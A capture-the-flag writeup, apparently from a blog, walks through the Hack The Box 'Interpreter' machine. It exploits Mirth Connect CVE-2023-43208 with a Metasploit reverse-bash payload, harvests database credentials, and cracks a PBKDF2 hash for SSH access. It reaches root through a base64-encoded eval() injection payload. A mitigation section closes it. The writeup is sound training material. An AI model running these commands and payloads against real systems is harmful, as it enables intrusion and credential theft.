@@ -1,0 +1,461 @@
+export const frontmatter = {
+  title: "Hack The Box Interpreter Machine Writeup",
+  slug: "hack-the-box-interpreter-machine-writeup",
+  category: "HTB Machine",
+  description:
+    "Complete walkthrough of the Hack The Box Interpreter machine, covering Mirth Connect enumeration, exploitation of CVE-2023-43208 for remote code execution, database credential extraction, PBKDF2 hash cracking, SSH lateral movement, and root privilege escalation through insecure Python eval() usage in a custom notification service.",
+  date: "2026-05-31",
+};
+
+export const metadata = {
+  title:
+    "HackTheBox Interpreter Writeup – Mirth Connect RCE to Root via Insecure eval() | loxcalhost",
+  description:
+    "Step-by-step Hack The Box Interpreter writeup demonstrating Mirth Connect version enumeration, exploitation of CVE-2023-43208, MariaDB credential abuse, PBKDF2-HMAC-SHA256 hash cracking, SSH pivoting to sedric, and root privilege escalation through a vulnerable Python notification service using eval() injection.",
+};
+
+
+## Introduction
+
+This write-up details the exploitation path for a Linux machine focusing on application vulnerabilities, database enumeration, and source code analysis.
+
+## Setup
+
+Download a VPN configuration file from the webpage and connect to it via `sudo openvpn file.ovpn`
+
+> **NOTE:** Replace `file.ovpn` with your VPN configuration file name
+
+To check if everything is working fine, we can use `ping <ip_addr>`
+
+## Attack Chain
+
+- **Initial Recon:** Nmap reveals a Jetty web server running Mirth Connect v4.4.0.
+- **Initial Access:** Exploited CVE-2023-43208 to achieve Remote Code Execution and gain a foothold as the `mirth` user.
+- **Credential Harvesting:** Extracted database credentials from `mirth.properties` and enumerated the local MariaDB instance to recover a PBKDF2-HMAC-SHA256 password hash.
+- **Lateral Movement:** Cracked the extracted hash using Hashcat, revealing the password to pivot to the `sedric` user via SSH.
+- **Local Enumeration:** Identified a custom systemd service (notif.py) listening on local port 54321, running as the `root` user.
+- **Privilege Escalation:** Bypassed a strict regex input filter using Base64 encoding to inject malicious Python code into an insecure `eval()` template, resulting in root-level code execution.
+
+## Enumeration
+
+Perform an Nmap scan with version detection (`-sV`) with: `nmap -sV -T4 <ip_addr>`:
+```
+Nmap scan report for 10.129.244.184
+Host is up (0.43s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
+80/tcp  open  http     Jetty
+443/tcp open  ssl/http Jetty
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+Visiting webpage revels that it runs Mirth Connect
+
+> **OBSERVATION:** `http://<ip_addr>/` doesn't show a login form but `https://<ip_addr>/` shows us a login form
+
+Visiting webpage revels that it's running Mirth Connect
+
+`curl -k -H 'X-Requested-With: ATTACKER' https://10.129.244.184/api/server/version` This revels that we are running v4.4.0
+
+We have used `X-Requested-With: ATTACKER` because without the header the server returns an error 
+```
+loxcalhost@linux[/]$ curl -k https://10.129.244.184/api/server/version
+
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1"/>
+<title>Error 400 All requests must have &apos;X-Requested-With&apos; header</title>
+</head>
+<body><h2>HTTP ERROR 400 All requests must have &apos;X-Requested-With&apos; header</h2>
+<table>
+<tr><th>URI:</th><td>/api/server/version</td></tr>
+<tr><th>STATUS:</th><td>400</td></tr>
+<tr><th>MESSAGE:</th><td>All requests must have &apos;X-Requested-With&apos; header</td></tr>
+<tr><th>SERVLET:</th><td>org.glassfish.jersey.servlet.ServletContainer-154ecc6</td></tr>
+</table>
+
+</body>
+</html>
+```
+
+A Google search reveals that it's vulnerable to CVE-2023-43208
+
+A public exploit for this vulnerability is available in the Metasploit Framework, which was used to gain initial access.
+
+## Foothold
+
+Start the Metasploit Console with `msfconsole`
+```
+                                                  
+
+      .:okOOOkdc'           'cdkOOOko:.
+    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
+   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
+  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
+  oOOOOOOOO.    .oOOOOoOOOOl.    ,OOOOOOOOo
+  dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx
+  lOOOOOOOO.         ;d;         ,OOOOOOOOl
+  .OOOOOOOO.   .;           ;    ,OOOOOOOO.
+   cOOOOOOO.   .OOc.     'oOO.   ,OOOOOOOc
+    oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo
+     lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl
+      ;OOOO'   .OOOO.   :OOOO.   ;OOOO;
+       .dOOo   .OOOOocccxOOOO.   xOOd.
+         ,kOl  .OOOOOOOOOOOOO. .dOk,
+           :kk;.OOOOOOOOOOOOO.cOk:
+             ;kOOOOOOOOOOOOOOOk:
+               ,xOOOOOOOOOOOx,
+                 .lOOOOOOOl.
+                    ,dOd,
+                      .
+
+       =[ metasploit v6.4.99-dev                                ]
++ -- --=[ 2,572 exploits - 1,317 auxiliary - 1,680 payloads     ]
++ -- --=[ 432 post - 49 encoders - 13 nops - 9 evasion          ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+The Metasploit Framework is a Rapid7 Open Source Project
+
+msf > 
+```
+
+Search for the exploit with `search mirth`
+```
+Matching Modules
+================
+
+   #  Name                                             Disclosure Date  Rank       Check  Description
+   -  ----                                             ---------------  ----       -----  -----------
+   0  exploit/multi/http/mirth_connect_cve_2023_43208  2023-10-25       excellent  Yes    Mirth Connect Deserialization RCE
+   1    \_ target: Unix Command                        .                .          .      .
+   2    \_ target: Windows Command                     .                .          .      .
+
+
+Interact with a module by name or index. For example info 2, use 2 or use exploit/multi/http/mirth_connect_cve_2023_43208
+After interacting with a module you can manually set a TARGET with set TARGET 'Windows Command'
+
+msf > 
+```
+
+Use `exploit/multi/http/mirth_connect_cve_2023_43208` with command `use exploit/multi/http/mirth_connect_cve_2023_43208`
+
+Set options with: 
+```
+set RHOSTS <ip_addr>
+set RPORT 443
+set payload cmd/unix/reverse_bash 
+set LHOST 10.10.14.49
+set LPORT 4444
+```
+
+> **NOTE:** Replace <ip_addr> with your machine's IP
+
+which if successful should return 
+```
+msf exploit(multi/http/mirth_connect_cve_2023_43208) > set RHOSTS <ip_addr>
+RHOSTS => <ip_addr>
+msf exploit(multi/http/mirth_connect_cve_2023_43208) > set RPORT 443
+RPORT => 443
+msf exploit(multi/http/mirth_connect_cve_2023_43208) > set payload cmd/unix/reverse_bash 
+payload => cmd/unix/reverse_bash
+msf exploit(multi/http/mirth_connect_cve_2023_43208) > set LHOST 10.10.14.43
+LHOST => 10.10.14.49
+msf exploit(multi/http/mirth_connect_cve_2023_43208) > set LPORT 4444
+LPORT => 4444
+```
+
+Hit `run` to run the exploit, which gives:
+```
+[*] Started reverse TCP handler on 10.10.14.39:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target appears to be vulnerable. Version 4.4.0 is affected by CVE-2023-43208.
+[*] Executing cmd/unix/reverse_bash (Unix Command)
+[+] The target appears to have executed the payload.
+[*] Command shell session 1 opened (10.10.14.39:4444 -> 10.129.244.184:45484) at 2026-04-18 22:53:50 +0530
+```
+
+Stabilize the shell with:
+- `python3 -c 'import pty; pty.spawn("/bin/bash")'`
+- Then `CTRL+Z` to run it in background
+- `stty raw -echo;fg` this sets the terminal to raw mode with no input echo, then brings a suspended job back to the foreground.
+- Press ENTER twice
+- `export TERM=xterm` this sets terminal type to xterm
+- `export SHELL=/bin/bash` this sets default shell to Bash
+
+Which finally gives us:
+```
+mirth@interpreter:/usr/local/mirthconnect$ 
+```
+
+We can look for Mirth configurations under `/usr/local/mirthconnect/conf/` in `mirth.properties` with `cat`
+```
+...<SNIP>...
+# database credentials
+database.username = ████████
+database.password = ████████████
+...<SNIP>...
+```
+
+Login to database with `mysql -u mirthdb -p'████████████'`
+
+> **NOTE:** ████████████ represents redacted text
+
+```
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 35
+Server version: 10.11.14-MariaDB-0+deb12u2 Debian 12
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]>
+```
+
+To see available databases use `SHOW DATABASES;`
+```
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mc_bdd_prod        |
++--------------------+
+2 rows in set (0.001 sec)
+
+```
+
+To switch to a particular database use `use mc_bdd_prod`:
+```
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MariaDB [mc_bdd_prod]> 
+```
+
+View available tables with `SHOW TABLES;`
+```
++-----------------------+
+| Tables_in_mc_bdd_prod |
++-----------------------+
+| ALERT                 |
+| CHANNEL               |
+| CHANNEL_GROUP         |
+| CODE_TEMPLATE         |
+| CODE_TEMPLATE_LIBRARY |
+| CONFIGURATION         |
+| DEBUGGER_USAGE        |
+| D_CHANNELS            |
+| D_M1                  |
+| D_MA1                 |
+| D_MC1                 |
+| D_MCM1                |
+| D_MM1                 |
+| D_MS1                 |
+| D_MSQ1                |
+| EVENT                 |
+| PERSON                |
+| PERSON_PASSWORD       |
+| PERSON_PREFERENCE     |
+| SCHEMA_INFO           |
+| SCRIPT                |
++-----------------------+
+21 rows in set (0.001 sec)
+
+MariaDB [mc_bdd_prod]> 
+
+```
+
+To view the content of the table use `SELECT * FROM PERSON_PASSWORD`:
+```
++-----------+----------------------------------------------------------+---------------------+
+| PERSON_ID | PASSWORD                                                 | PASSWORD_DATE       |
++-----------+----------------------------------------------------------+---------------------+
+|         2 | u/+LBBOU█████████████████████████████████████/kLMt3w+w== | 2025-09-19 09:22:28 |
++-----------+----------------------------------------------------------+---------------------+
+1 row in set (0.001 sec)
+
+MariaDB [mc_bdd_prod]> 
+```
+
+Copy the password!
+
+> `SELECT * FROM PERSON;` shows user `sedric` present on the system
+
+The password is exactly 56 characters long and it's base64 encoded, When you decode a 56-character Base64 string, it results in exactly 40 bytes of raw data
+
+40 does not match any standard hash lengths, but 40 bytes is the exact length of a 32-byte SHA-256 hash plus an 8-byte salt
+
+With `echo "u/+LBBOU█████████████████████████████████████/kLMt3w+w==" | base64 -d | xxd -p -c 50` we'll get 80 character hexadecimal string, since 1 byte = 2 hex characters
+```
+bbff8b███████████████████████████████████████████████████████████████90b32ddf0fb
+```
+
+So the first 16 characters of string represents the salt and rest 64 represents the hash
+
+In version 4.4.0 of Mirth Connect the default password hashing algorithm was upgraded to **PBKDF2-HMAC-SHA256**, which uses hashcat mode 10900, so it expects the hash and salt to be individually Base64 encoded and formatted like `sha256:iterations:base64_salt:base64_hash`
+
+From `mirth.properties`, we know that `digest.iterations` value is **600000**
+
+Now convert your split hex strings back into Base64, which can be build with:
+```
+SALT_B64=$(echo -n "bb████████████a7" | xxd -r -p | base64 -w 0)
+HASH_B64=$(echo -n "62████████████████████████████████████████████████████████████fb" | xxd -r -p | base64 -w 0)
+echo "sha256:600000:$SALT_B64:$HASH_B64" > hash_10900.txt
+```
+
+To crack it use `hashcat -m 10900 -a 0 hash_10900.txt rockyou.txt`, here
+
+- `-m 10900` is used to specify the hash type to PBKDF2-HMAC-SHA256
+- `-a 0` specifies attack mode to dictionary attack, which means it will try each password from a wordlist as it is
+- `has_10900.txt` is our filename where hash is stored and `rockyou.txt` is our wordlist
+
+To view the cracked password use `hashcat -m 10900 -a 0 hash_10900.txt rockyou.txt --show`
+```
+sha256:600000:u/+LBBOU█████████████████████████████████████/kLMt3w+w==:sn██████e1
+```
+
+Connect with `ssh sedric@<ip_addr>` and enter password when prompted
+```
+sedric@10.129.244.184's password: sn██████e1
+Linux interpreter 6.1.0-43-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.162-1 (2026-02-08) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sat Apr 18 15:24:40 2026 from 10.10.14.39
+sedric@interpreter:~$ 
+```
+
+Grab the flag from `/home/sedric` with `cat /home/sedric/user.txt`
+```
+5e2██████████████████████████eb7
+```
+
+## Internal Enumeration
+
+`systemctl list-units --type=service --state=running` shows running services
+```
+  UNIT                      LOAD   ACTIVE SUB     DESCRIPTION                                   
+  auditd.service            loaded active running Security Auditing Service
+  cron.service              loaded active running Regular background program processing daemon
+  dbus.service              loaded active running D-Bus System Message Bus
+  fail2ban.service          loaded active running Fail2Ban Service
+  getty@tty1.service        loaded active running Getty on tty1
+  mariadb.service           loaded active running MariaDB 10.11.14 database server
+  mcservice.service         loaded active running Mirth Connect Service
+  notif.service             loaded active running Notification server
+  rsyslog.service           loaded active running System Logging Service
+  ssh.service               loaded active running OpenBSD Secure Shell server
+  systemd-journald.service  loaded active running Journal Service
+  systemd-logind.service    loaded active running User Login Management
+  systemd-timesyncd.service loaded active running Network Time Synchronization
+  systemd-udevd.service     loaded active running Rule-based Manager for Device Events and Files
+  user@1000.service         loaded active running User Manager for UID 1000
+  vmware-tools.service      loaded active running LSB: VMware Tools service
+  wpa_supplicant.service    loaded active running WPA supplicant
+
+LOAD   = Reflects whether the unit definition was properly loaded.
+ACTIVE = The high-level unit activation state, i.e. generalization of SUB.
+SUB    = The low-level unit activation state, values depend on unit type.
+17 loaded units listed.
+```
+
+`notif.service` is not a standard linux service
+
+It's configuration file can be checked with `systemctl cat notif.service`:
+```
+# /etc/systemd/system/notif.service
+[Unit]
+Description=Notification server
+After=network-online.target
+Wants=network-online.target
+
+[Service]
+Type=simple
+ExecStart=/usr/bin/python3 /usr/local/bin/notif.py
+Restart=always
+User=root
+WorkingDirectory=/usr/local/bin
+
+[Install]
+WantedBy=multi-user.target
+```
+
+`ExecStart` shows us that it's location is `/usr/local/bin/notif.py`
+
+## Privilege Escalation and Exploitation
+
+The analyzed file reveals that a service is running on the internal network at port `54321`. This service is configured to accept requests exclusively from `127.0.0.1`, effectively restricting access to the local host.
+
+Before processing any incoming data, the application performs strict input validation using the following regular expression:
+```
+^[a-zA-Z0-9._'"(){}=+/]+$
+```
+
+This filter ensures that only alphanumeric characters and a limited set of symbols are permitted. Any request containing characters outside this allowed set is immediately rejected
+
+Now the core vulnerability lies in 
+```
+template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, received from {sender} at {ts}"
+try:
+    return eval(f"f'''{template}'''")
+```
+
+This takes user-supplied variables, inserted them into a string, and then passed that string into Python's `eval()` function as an f-string. In Python, an f-string evaluates whatever is placed inside curly brackets `{}`. Since the script is running as root, any Python code we pass inside brackets would be executed as the `root` user
+
+Since the regex doesn't allow us to use white spaces, we'll base64 encode our command
+
+Normally, to decode base64, we would run:
+```
+import base64
+import os
+decoded = base64.b64decode('Y2F0IC9yb290L3Jvb3QudHh0').decode()
+os.popen(decoded).read()
+```
+
+But since regex has prohibited white spaces, we can't write `import base64`, to tackle this we'll use Python's in-built `__import__()` function, which allows us to load modules dynamically without using spaces
+
+So, the code now can be compressed into `__import__('os').popen(__import__('base64').b64decode('Y2F0IC9yb290L3Jvb3QudHh0').decode()).read()`
+
+In Python f-strings, anything wrapped in curly brackets `{}` is treated as code and executed, so by wrapping our space-free payload in brackets, we force Python to execute our stager, decode our hidden command, and run it as root
+
+> **NOTE:** When `Y2F0IC9yb290L3Jvb3QudHh0` is decoded, it shows `cat /root/root.txt` which gives us the root flag
+
+> **NOTE:** In real world scenarios, you can use this vulnerability to get a reverse shell
+
+Craft the payload with:
+```
+cat << 'EOF' > payload.xml
+<patient>
+    <firstname>{__import__('os').popen(__import__('base64').b64decode('Y2F0IC9yb290L3Jvb3QudHh0').decode()).read()}</firstname>
+    <lastname>User</lastname>
+    <sender_app>App</sender_app>
+    <timestamp>1234</timestamp>
+    <birth_date>01/01/2000</birth_date>
+    <gender>M</gender>
+</patient>
+EOF
+```
+
+> **NOTE:** Upon observing the `notif.py` it shows that, the data should be in XML formatting, with `<patient>` as root node, with six required child tags `["firstname", "lastname", "sender_app", "timestamp", "birth_date", "gender"]`
+
+Execute it with `wget --header="Content-Type: application/xml" --post-file=payload.xml http://127.0.0.1:54321/addPatient -q -O -`, which returns
+```
+Patient de████████████████████████████7e
+ User (M), 26 years old, received from App at 1234sedric@interpreter:/tmp/test$ 
+
+```
+
+Which gives us, our root flag: `de████████████████████████████7e`
+
+## Mitigation
+
+- Update Mirth Connect to the latest version
+- On `mirth.properties` Principle of Least Privilege should be applied. Configuration files containing sensitive credentials should only be readable by the specific service account that requires them
+- In `notif.py`, at code level remove dangerous functions, such as `eval()`, and use standard, safe string formatting
+- The system administrator should create a dedicated, low-privileged service account (e.g., `notif_svc`). The ownership of the `/var/secure-health/patients/` directory should be transferred to this user. Finally, the `notif.service` systemd file should be updated to execute the script as `notif_svc` rather than `root`.
